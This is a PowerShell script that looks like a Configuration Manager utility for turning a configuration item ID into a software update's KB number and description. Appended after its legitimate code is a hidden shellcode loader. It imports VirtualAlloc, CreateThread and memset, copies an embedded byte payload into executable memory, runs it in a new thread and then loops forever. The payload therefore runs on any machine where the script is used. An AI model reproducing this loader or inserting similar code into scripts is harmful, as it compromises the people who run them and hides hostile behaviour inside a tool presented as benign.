﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName="CIID", HelpMessage="Site server name with SMS Provider installed")]
    [parameter(ParameterSetName="CIUniqueID")]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [ValidateNotNullorEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, ParameterSetName="CIID", HelpMessage="Specify the CI_ID to convert to a Software Update")]
    [ValidateNotNullorEmpty()]
    [string]$CIID,
    [parameter(Mandatory=$true, ParameterSetName="CIUniqueID", HelpMessage="Specify the CI_UniqueID to convert to a Software Update")]
    [ValidateNotNullorEmpty()]
    [string]$CIUniqueID
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message ; break
    }
}
Process {
    try {
        if ($PSBoundParameters["CIID"]) {
            $SoftwareUpdates = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_SoftwareUpdate -Filter "CI_ID like '$($CIID)'" -ErrorAction Stop
        }
        if ($PSBoundParameters["CIUniqueID"]) {
            $SoftwareUpdates = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_SoftwareUpdate -Filter "CI_UniqueID like '$($CIUniqueID)'" -ErrorAction Stop
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message ; break
    }
    if ($SoftwareUpdates -ne $null) {
        foreach ($SoftwareUpdate in $SoftwareUpdates) {
            $PSObject = [PSCustomObject]@{
                ArticleID = "KB" + $SoftwareUpdate.ArticleID
                Description = $SoftwareUpdate.LocalizedDisplayName
            }
            Write-Output $PSObject
        }
    }
    else {
        Write-Warning -Message "No Software Update was found matching the specified search criteria"
    }
}
$wWD = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wWD -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x54,0x0d,0x56,0xe8,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xea,0xfc,0x03,0x7a,0x5b,0xef,0xa3,0x14,0x8b,0x6d,0x4b,0xe5,0x4b,0x12,0xc5,0x00,0x7a,0x12,0xb1,0x41,0x2c,0xa2,0xb1,0x04,0xc0,0x49,0x97,0xbc,0x53,0x3f,0x30,0xb2,0xd4,0x8a,0x66,0xfd,0xe5,0xa7,0x5b,0x9c,0x65,0xba,0x8f,0x7e,0x54,0x75,0xc2,0x7f,0x91,0x68,0x2f,0x2d,0x4a,0xe6,0x82,0xc2,0xff,0xb2,0x1e,0x68,0xb3,0x53,0x27,0x8d,0x03,0x55,0x06,0x00,0x18,0x0c,0x88,0xa2,0xcd,0x24,0x81,0xbc,0x12,0x00,0x5b,0x36,0xe0,0xfe,0x5a,0x9e,0x39,0xfe,0xf1,0xdf,0xf6,0x0d,0x0b,0x27,0x30,0xee,0x7e,0x51,0x43,0x93,0x78,0xa6,0x3e,0x4f,0x0c,0x3d,0x98,0x04,0xb6,0x99,0x19,0xc8,0x21,0x69,0x15,0xa5,0x26,0x35,0x39,0x38,0xea,0x4d,0x45,0xb1,0x0d,0x82,0xcc,0x81,0x29,0x06,0x95,0x52,0x53,0x1f,0x73,0x34,0x6c,0x7f,0xdc,0xe9,0xc8,0x0b,0xf0,0xfe,0x60,0x56,0x9c,0x33,0x49,0x69,0x5c,0x5c,0xda,0x1a,0x6e,0xc3,0x70,0xb5,0xc2,0x8c,0x5e,0x42,0x25,0xa7,0x27,0xdc,0xd8,0x48,0x58,0xf4,0x1e,0x1c,0x08,0x6e,0xb7,0x1d,0xc3,0x6e,0x38,0xc8,0x44,0x3f,0x96,0xa3,0x24,0xef,0x56,0x14,0xcd,0xe5,0x59,0x4b,0xed,0x05,0xb0,0xe4,0x84,0xfc,0x52,0xcb,0xf1,0xff,0x07,0xa3,0x03,0x00,0x56,0x53,0x8d,0xe6,0x32,0x8b,0xdb,0xb1,0xaa,0x32,0x46,0x49,0x4b,0xba,0x5c,0x37,0x4b,0x30,0x53,0xc7,0x05,0xb1,0x1e,0xdb,0xf1,0x31,0x55,0x81,0x57,0x4d,0x43,0xac,0x57,0xdb,0x68,0x67,0x00,0x73,0x73,0x5e,0x66,0xdc,0x8c,0xb5,0xfd,0xd5,0x18,0x76,0x69,0x1a,0xcd,0x76,0x69,0x4c,0x87,0x76,0x01,0x28,0xf3,0x24,0x34,0x37,0x2e,0x59,0xe5,0xa2,0xd1,0x08,0x5a,0x64,0xba,0xb6,0x85,0x42,0x65,0x48,0xe0,0x52,0x59,0x9f,0xcc,0x20,0xb3,0x23;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$f6y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($f6y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$f6y,0,0,0);for (;;){Start-sleep 60};

